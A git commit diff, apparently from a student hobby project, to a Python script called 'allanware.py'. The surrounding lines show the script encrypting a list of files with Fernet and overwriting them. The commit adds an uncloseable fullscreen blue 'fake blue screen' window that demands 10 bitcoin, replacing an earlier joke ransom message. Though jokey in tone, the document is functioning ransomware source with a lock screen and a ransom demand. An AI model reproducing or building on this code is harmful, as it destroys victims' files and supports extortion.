ff7ba5029a255e913b54465b8e46a1d9a8b1e96a
Daniel Ferrer <dferrer@uncc.edu>
2024-09-11 23:01:22 -0400

    Testing allanware for the first time!

--- allanware.py
+++ allanware.py
@@ -2,6 +2,21 @@
 import os
 from cryptography.fernet import Fernet
 #let's hack with allan
+import tkinter as tk
+
+def fake_blue_screen():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(background='blue')
+
+    label = tk.Label(root, text="Allan has hacked your syste, give me 10 bitcoin.", fg="white", bg="blue", font=("Helvetica", 16))
+    label.pack(expand=True)
+
+    # Disable the ability to close the window
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    # Infinite loop to keep the window open
+    root.mainloop()
 
 files =[]
 
@@ -23,4 +38,5 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
-print("Alan has encrypted your files, give me 1000 cheese or I'll delete them")
+
+fake_blue_screen()
